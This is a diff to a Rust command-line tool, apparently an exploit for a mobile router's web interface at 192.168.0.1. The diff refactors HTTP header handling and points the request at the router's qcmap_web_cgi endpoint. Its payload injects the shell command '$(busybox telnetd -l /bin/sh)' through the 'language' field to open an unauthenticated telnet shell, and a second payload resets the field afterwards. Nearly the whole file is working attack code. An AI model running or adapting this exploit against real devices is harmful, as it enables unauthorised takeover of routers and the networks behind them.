@@ -1,6 +1,8 @@
 use std::{collections::HashMap, ops::Add};
 use clap::Parser;
+use reqwest;
 use reqwest::header::*;
+use reqwest::header::{HeaderName,HeaderValue};
 use serde::{Deserialize, Serialize};
 use serde_json::Result;
 
@@ -49,7 +51,7 @@ struct Payload {
 
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main()  {
 
 	let args = Args::parse();
 	let token = args.token;
@@ -75,8 +77,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 		--data-raw '{"token":"xZorYxwA357MLtbd","module":"storageShare","action":1,"mode":0,"login":0,"rwPermission":1}'
 	 */
 
+	let local_token = String::from(&token);
+
 	let mut cookie = "tpweb_token=".to_string();
-	cookie.add(&token);
+	let cookie = cookie.add(&local_token);
 
 	let mut headers = HeaderMap::new();
 	headers.append(
@@ -84,61 +88,61 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 		"Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0".parse().unwrap()
 	);
 	headers.insert(
-		"Accept".to_string(),
-		"application/json, text/javascript, *SLASH*; q=0.01".to_string()
+		ACCEPT,
+		"application/json, text/javascript, *SLASH*; q=0.01".parse().unwrap()
 	);
 	headers.insert(
-		"Accept-Language".to_string(),
-		"de,en-US;q=0.7,en;q=0.3".to_string()
+		ACCEPT_LANGUAGE,
+		"de,en-US;q=0.7,en;q=0.3".parse().unwrap()
 	);
 	headers.insert(
-		"Accept-Encoding".to_string(),
-		"gzip, deflate".to_string()
+		ACCEPT_ENCODING,
+		"gzip, deflate".parse().unwrap()
 	);
 	headers.insert(
-		"Content-Type".to_string(),
-		"application/x-www-form-urlencoded; charset=UTF-8".to_string()
+		CONTENT_TYPE,
+		"application/x-www-form-urlencoded; charset=UTF-8".parse().unwrap()
 	);
 	headers.insert(
-		"X-Requested-With".to_string(),
-		"XMLHttpRequest".to_string()
+		HeaderName::from_lowercase(b"x-requested-with").unwrap(),
+		"XMLHttpRequest".parse().unwrap()
 	);
 	headers.insert(
-		"Origin".to_string(),
-		"http://192.168.0.1".to_string()
+		ORIGIN,
+		"http://192.168.0.1".parse().unwrap()
 	);
 	headers.insert(
-		"Connection".to_string(),
-		"keep-alive".to_string()
+		CONNECTION,
+		"keep-alive".parse().unwrap()
 	);
 	headers.insert(
-		"Referer".to_string(),
-		"http://192.168.0.1/settings.html".to_string()
+		REFERER,
+		"http://192.168.0.1/settings.html".parse().unwrap()
 	);
 	headers.insert(
-		"Cookie".to_string(),
-		String::from(&cookie)
+		COOKIE,
+		HeaderValue::from_str(&cookie).unwrap()
 	);
 	headers.insert(
-		"Pragma".to_string(),
-		"no-cache".to_string()
+		PRAGMA,
+		"no-cache".parse().unwrap()
 	);
 	headers.insert(
-		"Cache-Control".to_string(),
-		"no-cache".to_string()
+		CACHE_CONTROL,
+		"no-cache".parse().unwrap()
 	);
 
 	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/
 
 	let payload = Payload {
-		token: &token,
+		token: String::from(&token),
 		module: "webserver".to_string(),
 		action: 1,
 		language: "$(busybox telnetd -l /bin/sh)".to_string()
 	};
 
 	let payload_restore_language = Payload {
-		token: &token,
+		token: String::from(&token),
 		module: "webserver".to_string(),
 		action: 1,
 		language: "en".to_string()
@@ -148,13 +152,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 	let client = reqwest::Client::new();
 
-	let resp = client.post("http://192.168.0.1")
+	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
 		.json(&payload)
 		.headers(headers)
 		.send()
-		.await?;
+		.await;
 
     println!("{resp:#?}");
-    Ok(())
+
 }
 
